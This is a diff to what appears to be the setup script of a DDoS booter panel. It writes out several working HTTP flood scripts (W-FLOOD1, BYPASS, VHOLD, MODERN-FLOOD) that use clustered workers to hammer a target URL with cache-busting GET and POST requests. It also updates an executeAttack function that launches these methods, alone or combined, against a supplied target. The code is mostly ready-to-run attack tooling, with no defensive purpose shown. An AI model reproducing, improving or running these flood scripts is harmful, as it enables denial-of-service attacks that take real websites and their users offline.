@@ -24,6 +24,256 @@ function ensureMethodFiles() {
     console.log('[SETUP] Created methods directory');
   }
 
+  // ========== W-FLOOD1 - Real attack script ==========
+  const wfloodPath = path.join(methodsDir, 'w-flood1.js');
+  if (!fs.existsSync(wfloodPath)) {
+    const wfloodContent = `#!/usr/bin/env node
+const http = require('http');
+const https = require('https');
+const url = require('url');
+const cluster = require('cluster');
+
+// Parameters: node w-flood1.js <host> <time> <rate> <thread>
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]) || 60,
+    rate: parseInt(process.argv[4]) || 8,
+    threads: parseInt(process.argv[5]) || 3
+};
+
+if (!args.target) {
+    console.log('Usage: node w-flood1.js <host> <time> <rate> <thread>');
+    console.log('Example: node w-flood1.js https://example.com 60 8 3');
+    process.exit(1);
+}
+
+const parsed = new URL(args.target);
+const isHttps = parsed.protocol === 'https:';
+const httpLib = isHttps ? https : http;
+
+console.log(\`🔥 W-FLOOD | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads} | Rate: \${args.rate}/s\`);
+
+if (cluster.isMaster) {
+    for (let i = 0; i < args.threads; i++) {
+        cluster.fork();
+    }
+    setTimeout(() => {
+        console.log(\`✅ W-FLOOD finished - \${args.time}s completed\`);
+        process.exit(0);
+    }, args.time * 1000 + 2000);
+} else {
+    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
+    let running = true;
+    let count = 0;
+    
+    const sendRequest = () => {
+        if (!running) return;
+        const req = httpLib.request({
+            hostname: parsed.hostname,
+            port: parsed.port || (isHttps ? 443 : 80),
+            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
+            method: 'GET',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Cache-Control': 'no-cache'
+            },
+            agent: agent,
+            rejectUnauthorized: false
+        }, (res) => { count++; res.resume(); });
+        req.on('error', () => {});
+        req.end();
+        if (running) setTimeout(sendRequest, 1000 / args.rate);
+    };
+    
+    for (let i = 0; i < 10; i++) sendRequest();
+    
+    setInterval(() => {
+        console.log(\`📊 RPS: \${count}/s\`);
+        count = 0;
+    }, 1000);
+    
+    setTimeout(() => { running = false; }, args.time * 1000);
+}
+`;
+    fs.writeFileSync(wfloodPath, wfloodContent);
+    console.log('[SETUP] Created W-FLOOD1 method');
+  }
+
+  // ========== BYPASS.js - With correct parameters ==========
+  const bypassPath = path.join(methodsDir, 'BYPASS.js');
+  if (!fs.existsSync(bypassPath)) {
+    const bypassContent = `#!/usr/bin/env node
+const http = require('http');
+const https = require('https');
+const cluster = require('cluster');
+const url = require('url');
+const fs = require('fs');
+
+// Parameters: node BYPASS.js <host> <time> <rps> <threads> <proxyfile>
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]) || 60,
+    rps: parseInt(process.argv[4]) || 10,
+    threads: parseInt(process.argv[5]) || 90,
+    proxyfile: process.argv[6] || 'proxy.txt'
+};
+
+if (!args.target) {
+    console.log('Usage: node BYPASS.js <host> <time> <rps> <threads> <proxyfile>');
+    console.log('Example: node BYPASS.js https://example.com 60 10 90 proxy.txt');
+    process.exit(1);
+}
+
+const parsed = new URL(args.target);
+const isHttps = parsed.protocol === 'https:';
+const httpLib = isHttps ? https : http;
+
+// Load proxies
+let proxies = [];
+try {
+    if (fs.existsSync(args.proxyfile)) {
+        const data = fs.readFileSync(args.proxyfile, 'utf8');
+        proxies = data.split('\\n').map(line => line.trim()).filter(line => line && !line.startsWith('#') && line.includes(':'));
+        console.log(\`📋 Loaded \${proxies.length} proxies from \${args.proxyfile}\`);
+    }
+} catch(e) {}
+
+console.log(\`🔥 BYPASS | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads} | RPS: \${args.rps}\`);
+
+if (cluster.isMaster) {
+    for (let i = 0; i < args.threads; i++) {
+        cluster.fork();
+    }
+    setTimeout(() => {
+        console.log(\`✅ BYPASS finished - \${args.time}s completed\`);
+        process.exit(0);
+    }, args.time * 1000 + 2000);
+} else {
+    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
+    let running = true;
+    let count = 0;
+    let proxyIndex = 0;
+    
+    const sendRequest = () => {
+        if (!running) return;
+        
+        const req = httpLib.request({
+            hostname: parsed.hostname,
+            port: parsed.port || (isHttps ? 443 : 80),
+            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
+            method: 'GET',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Cache-Control': 'no-cache',
+                'Upgrade-Insecure-Requests': '1'
+            },
+            agent: agent,
+            rejectUnauthorized: false
+        }, (res) => { count++; res.resume(); });
+        req.on('error', () => {});
+        req.end();
+        if (running) setTimeout(sendRequest, 1000 / args.rps);
+    };
+    
+    for (let i = 0; i < 10; i++) sendRequest();
+    
+    setInterval(() => {
+        console.log(\`📊 RPS: \${count}/s\`);
+        count = 0;
+    }, 1000);
+    
+    setTimeout(() => { running = false; }, args.time * 1000);
+}
+`;
+    fs.writeFileSync(bypassPath, bypassContent);
+    console.log('[SETUP] Created BYPASS.js with correct parameters');
+  }
+
+  // ========== VHOLD.js - With correct parameters ==========
+  const vholdPath = path.join(methodsDir, 'vhold.js');
+  if (!fs.existsSync(vholdPath)) {
+    const vholdContent = `#!/usr/bin/env node
+const http = require('http');
+const https = require('https');
+const cluster = require('cluster');
+const url = require('url');
+
+// Parameters: node vhold.js <host> <time> <rate> <thread>
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]) || 60,
+    rate: parseInt(process.argv[4]) || 15,
+    threads: parseInt(process.argv[5]) || 2
+};
+
+if (!args.target) {
+    console.log('Usage: node vhold.js <host> <time> <rate> <thread>');
+    console.log('Example: node vhold.js https://example.com 60 15 2');
+    process.exit(1);
+}
+
+const parsed = new URL(args.target);
+const isHttps = parsed.protocol === 'https:';
+const httpLib = isHttps ? https : http;
+
+console.log(\`🔥 VHOLD | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads} | Rate: \${args.rate}/s\`);
+
+if (cluster.isMaster) {
+    for (let i = 0; i < args.threads; i++) {
+        cluster.fork();
+    }
+    setTimeout(() => {
+        console.log(\`✅ VHOLD finished - \${args.time}s completed\`);
+        process.exit(0);
+    }, args.time * 1000 + 2000);
+} else {
+    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
+    let running = true;
+    let count = 0;
+    
+    const sendRequest = () => {
+        if (!running) return;
+        const req = httpLib.request({
+            hostname: parsed.hostname,
+            port: parsed.port || (isHttps ? 443 : 80),
+            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
+            method: 'GET',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Cache-Control': 'no-cache'
+            },
+            agent: agent,
+            rejectUnauthorized: false
+        }, (res) => { count++; res.resume(); });
+        req.on('error', () => {});
+        req.end();
+        if (running) setTimeout(sendRequest, 1000 / args.rate);
+    };
+    
+    for (let i = 0; i < 10; i++) sendRequest();
+    
+    setInterval(() => {
+        console.log(\`📊 RPS: \${count}/s\`);
+        count = 0;
+    }, 1000);
+    
+    setTimeout(() => { running = false; }, args.time * 1000);
+}
+`;
+    fs.writeFileSync(vholdPath, vholdContent);
+    console.log('[SETUP] Created VHOLD method');
+  }
+
   // ========== RAW-GET - High RPS GET Flood ==========
   const rawGetPath = path.join(methodsDir, 'raw-get.js');
   if (!fs.existsSync(rawGetPath)) {
@@ -49,8 +299,9 @@ const parsed = new URL(args.target);
 const isHttps = parsed.protocol === 'https:';
 const httpLib = isHttps ? https : http;
 
+console.log(\`🔥 RAW-GET | Target: \${args.target} | Time: \${args.time}s | Workers: \${args.threads} | Rate: \${args.rate}/s\`);
+
 if (cluster.isMaster) {
-    console.log(\`🔥 RAW-GET Flood | Target: \${args.target} | Time: \${args.time}s | Workers: \${args.threads}\`);
     for (let i = 0; i < args.threads; i++) {
         cluster.fork();
     }
@@ -130,10 +381,14 @@ const userAgents = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
 ];
 
+console.log(\`🔥 CF-BYPASS | Target: \${args.target} | Time: \${args.time}s | Workers: \${args.threads}\`);
+
 if (cluster.isMaster) {
-    console.log(\`🔥 CF-BYPASS | Target: \${args.target} | Time: \${args.time}s | Workers: \${args.threads}\`);
     for (let i = 0; i < args.threads; i++) cluster.fork();
-    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
+    setTimeout(() => {
+        console.log(\`✅ CF-BYPASS finished - \${args.time}s completed\`);
+        process.exit(0);
+    }, args.time * 1000 + 2000);
 } else {
     const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
     let running = true;
@@ -181,27 +436,24 @@ if (cluster.isMaster) {
     console.log('[SETUP] Created CF-BYPASS method');
   }
 
-  // ========== BYPASS.js - With correct parameters ==========
-  const bypassPath = path.join(methodsDir, 'BYPASS.js');
-  if (!fs.existsSync(bypassPath)) {
-    const bypassContent = `#!/usr/bin/env node
+  // ========== MODERN-FLOOD - High intensity flood ==========
+  const modernPath = path.join(methodsDir, 'modern-flood.js');
+  if (!fs.existsSync(modernPath)) {
+    const modernContent = `#!/usr/bin/env node
 const http = require('http');
 const https = require('https');
 const cluster = require('cluster');
 const url = require('url');
-const fs = require('fs');
 
-// Parameters: node BYPASS.js <host> <time> <rps> <threads> <proxyfile>
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]) || 60,
-    rps: parseInt(process.argv[4]) || 10,
-    threads: parseInt(process.argv[5]) || 90,
-    proxyfile: process.argv[6] || 'proxy.txt'
+    threads: parseInt(process.argv[4]) || 4,
+    rate: parseInt(process.argv[5]) || 64
 };
 
 if (!args.target) {
-    console.log('Usage: node BYPASS.js <host> <time> <rps> <threads> <proxyfile>');
+    console.log('Usage: node modern-flood.js <target> <time> [threads] [rate]');
     process.exit(1);
 }
 
@@ -209,134 +461,41 @@ const parsed = new URL(args.target);
 const isHttps = parsed.protocol === 'https:';
 const httpLib = isHttps ? https : http;
 
-// Load proxies
-let proxies = [];
-try {
-    if (fs.existsSync(args.proxyfile)) {
-        const data = fs.readFileSync(args.proxyfile, 'utf8');
-        proxies = data.split('\\n').map(line => line.trim()).filter(line => line && !line.startsWith('#') && line.includes(':'));
-        console.log(\`📋 Loaded \${proxies.length} proxies from \${args.proxyfile}\`);
-    }
-} catch(e) {}
+console.log(\`🔥 MODERN-FLOOD | Target: \${args.target} | Time: \${args.time}s | Workers: \${args.threads}\`);
 
 if (cluster.isMaster) {
-    console.log(\`🔥 BYPASS | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads} | RPS: \${args.rps}\`);
-    for (let i = 0; i < args.threads; i++) {
-        cluster.fork();
-    }
-    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
+    for (let i = 0; i < args.threads; i++) cluster.fork();
+    setTimeout(() => {
+        console.log(\`✅ MODERN-FLOOD finished - \${args.time}s completed\`);
+        process.exit(0);
+    }, args.time * 1000 + 2000);
 } else {
     const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
     let running = true;
     let count = 0;
-    let proxyIndex = 0;
     
     const sendRequest = () => {
         if (!running) return;
-        
-        let proxy = null;
-        if (proxies.length > 0) {
-            proxy = proxies[proxyIndex % proxies.length];
-            proxyIndex++;
-            const [ip, port] = proxy.split(':');
-            // Use proxy if available
-        }
-        
         const req = httpLib.request({
             hostname: parsed.hostname,
             port: parsed.port || (isHttps ? 443 : 80),
             path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
-            method: 'GET',
+            method: Math.random() > 0.5 ? 'GET' : 'POST',
             headers: {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept': '*/*',
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Connection': 'keep-alive',
                 'Cache-Control': 'no-cache',
-                'Upgrade-Insecure-Requests': '1'
+                'Content-Type': 'application/x-www-form-urlencoded'
             },
             agent: agent,
             rejectUnauthorized: false
         }, (res) => { count++; res.resume(); });
         req.on('error', () => {});
-        req.end();
-        if (running) setTimeout(sendRequest, 1000 / args.rps);
-    };
-    
-    for (let i = 0; i < 10; i++) sendRequest();
-    
-    setInterval(() => {
-        console.log(\`📊 RPS: \${count}/s\`);
-        count = 0;
-    }, 1000);
-    
-    setTimeout(() => { running = false; }, args.time * 1000);
-}
-`;
-    fs.writeFileSync(bypassPath, bypassContent);
-    console.log('[SETUP] Created BYPASS.js with correct parameters');
-  }
-
-  // ========== VHOLD.js - With correct parameters ==========
-  const vholdPath = path.join(methodsDir, 'vhold.js');
-  if (!fs.existsSync(vholdPath)) {
-    const vholdContent = `#!/usr/bin/env node
-const http = require('http');
-const https = require('https');
-const cluster = require('cluster');
-const url = require('url');
-const fs = require('fs');
-
-// Parameters: node vhold.js <host> <time> <rate> <thread> <proxy>
-const args = {
-    target: process.argv[2],
-    time: parseInt(process.argv[3]) || 60,
-    rate: parseInt(process.argv[4]) || 15,
-    threads: parseInt(process.argv[5]) || 2,
-    proxyfile: process.argv[6] || 'proxy.txt'
-};
-
-if (!args.target) {
-    console.log('Usage: node vhold.js <host> <time> <rate> <thread> <proxy>');
-    console.log('Example: node vhold.js https://example.com 60 15 2 proxy.txt');
-    process.exit(1);
-}
-
-const parsed = new URL(args.target);
-const isHttps = parsed.protocol === 'https:';
-const httpLib = isHttps ? https : http;
-
-console.log(\`🔥 VHOLD | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads} | Rate: \${args.rate}\`);
-
-if (cluster.isMaster) {
-    for (let i = 0; i < args.threads; i++) {
-        cluster.fork();
-    }
-    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
-} else {
-    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
-    let running = true;
-    let count = 0;
-    
-    const sendRequest = () => {
-        if (!running) return;
-        const req = httpLib.request({
-            hostname: parsed.hostname,
-            port: parsed.port || (isHttps ? 443 : 80),
-            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
-            method: 'GET',
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Accept': 'text/html,application/xhtml+xml',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Cache-Control': 'no-cache'
-            },
-            agent: agent,
-            rejectUnauthorized: false
-        }, (res) => { count++; res.resume(); });
-        req.on('error', () => {});
+        if (req.method === 'POST') {
+            req.write('data=' + Math.random().toString(36).substring(7));
+        }
         req.end();
         if (running) setTimeout(sendRequest, 1000 / args.rate);
     };
@@ -351,88 +510,14 @@ if (cluster.isMaster) {
     setTimeout(() => { running = false; }, args.time * 1000);
 }
 `;
-    fs.writeFileSync(vholdPath, vholdContent);
-    console.log('[SETUP] Created VHOLD method');
-  }
-
-  // ========== W-FLOOD1.js - With correct parameters ==========
-  const wfloodPath = path.join(methodsDir, 'w-flood1.js');
-  if (!fs.existsSync(wfloodPath)) {
-    const wfloodContent = `#!/usr/bin/env node
-const http = require('http');
-const https = require('https');
-const cluster = require('cluster');
-const url = require('url');
-
-// Parameters: node w-flood1.js <host> <time> <rate> <thread>
-const args = {
-    target: process.argv[2],
-    time: parseInt(process.argv[3]) || 60,
-    rate: parseInt(process.argv[4]) || 8,
-    threads: parseInt(process.argv[5]) || 3
-};
-
-if (!args.target) {
-    console.log('Usage: node w-flood1.js <host> <time> <rate> <thread>');
-    process.exit(1);
-}
-
-const parsed = new URL(args.target);
-const isHttps = parsed.protocol === 'https:';
-const httpLib = isHttps ? https : http;
-
-console.log(\`🔥 W-FLOOD | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads}\`);
-
-if (cluster.isMaster) {
-    for (let i = 0; i < args.threads; i++) {
-        cluster.fork();
-    }
-    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
-} else {
-    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
-    let running = true;
-    let count = 0;
-    
-    const sendRequest = () => {
-        if (!running) return;
-        const req = httpLib.request({
-            hostname: parsed.hostname,
-            port: parsed.port || (isHttps ? 443 : 80),
-            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
-            method: 'GET',
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Accept': 'text/html,application/xhtml+xml',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Cache-Control': 'no-cache'
-            },
-            agent: agent,
-            rejectUnauthorized: false
-        }, (res) => { count++; res.resume(); });
-        req.on('error', () => {});
-        req.end();
-        if (running) setTimeout(sendRequest, 1000 / args.rate);
-    };
-    
-    for (let i = 0; i < 10; i++) sendRequest();
-    
-    setInterval(() => {
-        console.log(\`📊 RPS: \${count}/s\`);
-        count = 0;
-    }, 1000);
-    
-    setTimeout(() => { running = false; }, args.time * 1000);
-}
-`;
-    fs.writeFileSync(wfloodPath, wfloodContent);
-    console.log('[SETUP] Created W-FLOOD method');
+    fs.writeFileSync(modernPath, modernContent);
+    console.log('[SETUP] Created MODERN-FLOOD method');
   }
 
   // Create stub for other methods
   const otherMethods = [
     'REX-COSTUM.js', 'cibi.js', 'nust.js', 'h2-nust.js', 'http-panel.js',
-    'high-dstat.js', 'uam.js', 'wil.js', 'modern-flood.js',
+    'high-dstat.js', 'uam.js', 'wil.js',
     'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js',
     'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'
   ];
@@ -682,8 +767,8 @@ function executeAttack(target, time, methods) {
     // node BYPASS.js <host> <time> <rps> <threads> <proxyfile>
     execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
   } else if (methods === 'VHOLD') {
-    // node vhold.js <host> <time> <rate> <thread> <proxy>
-    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
+    // node vhold.js <host> <time> <rate> <thread>
+    execWithLog(`node methods/vhold.js ${target} ${time} 15 2`);
   } else if (methods === 'W-FLOOD') {
     // node w-flood1.js <host> <time> <rate> <thread>
     execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
@@ -698,7 +783,7 @@ function executeAttack(target, time, methods) {
   } else if (methods === 'R9') {
     execWithLog(`node methods/high-dstat.js ${target} ${time}`);
     execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
-    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
+    execWithLog(`node methods/vhold.js ${target} ${time} 15 2`);
     execWithLog(`node methods/nust.js ${target} ${time}`);
     execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
   } else if (methods === 'PRIV-TOR') {
@@ -710,7 +795,7 @@ function executeAttack(target, time, methods) {
   } else if (methods === 'HOLD-PANEL') {
     execWithLog(`node methods/http-panel.js ${target} ${time}`);
   } else if (methods === 'R1') {
-    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
+    execWithLog(`node methods/vhold.js ${target} ${time} 15 2`);
     execWithLog(`node methods/high-dstat.js ${target} ${time}`);
     execWithLog(`node methods/cibi.js ${target} ${time}`);
     execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
